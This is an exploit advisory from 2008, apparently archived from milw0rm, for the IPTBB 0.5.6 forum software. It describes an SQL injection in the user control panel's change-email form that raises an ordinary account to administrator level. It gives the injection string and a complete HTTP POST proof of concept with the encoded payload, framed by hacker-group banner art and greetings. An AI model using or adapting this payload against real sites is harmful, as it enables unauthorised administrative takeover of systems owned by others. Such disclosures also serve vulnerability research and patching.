@@ -1,0 +1,77 @@
+
+=========================================
+ IPTBB 0.5.6 Arbitrary Add-Admin Exploit 
+=========================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 11 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : IPTBB
+ VERSION     : 0.5.6
+ VENDOR	     : http://iptbb.org/
+ DOWNLOAD    : http://sourceforge.net/projects/iptbb
+#####################################################
+
+---Add-Admin Exploit---
+
+***magic_quotes_gpc = off***
+
+-------------
+ Description
+-------------
+
+	IPTBB 0.5.6 have Vulnerability to escalate user's privilege to administartor's privilege.
+That Vulnerable in "User Control Panel - Change Email" (http://[Target]/[iptbb_path]/index.php?act=usercp&p=email) 
+and you can injection code into form,This action will give your account can use Admin Control Panel (http://[Target]/[iptbb_path]/admincp.php)
+with Administrative's Privilege.
+
+-----------------
+ Vulnerable Path
+-----------------
+[+] http://[Target]/[iptbb_path]/index.php?act=usercp&p=email
+
+--------------
+ Exploit code 
+--------------
+[+] hacked',`level`='2
+
+-----
+ POC
+-----
+
+[+]POST http://[Target]/[iptbb_path]/index.php?act=usercp&p=email HTTP/1.1
+[+]Host: [Target]
+[+]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
+[+]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+[+]Accept-Language: en-us,en;q=0.5
+[+]Accept-Encoding: gzip,deflate
+[+]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+[+]Keep-Alive: 300
+[+]Proxy-Connection: keep-alive
+[+]Referer: http://localhost/iptbb/index.php?act=usercp&p=email
+[+]Cookie: fusion_visited=yes; PHPSESSID=4a17d6283eef21e4e1d8e3264f9f26da; FOGSESSID=cce32d569575ec08780837d529947183; pfbx_sess=d96d044ae57aede13f2d8dc32779c80f; username=cwh; password=72eb4fe81127a6aa8d009b9dc31753da
+[+]Content-Type: application/x-www-form-urlencoded
+[+]Content-length: 109
+[+]
+[+]email=hacked%27%2C%60level%60%3D%272&cemail=hacked%27%2C%60level%60%3D%272&curemail=aa%40aa.com&submit=Submit
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-11]
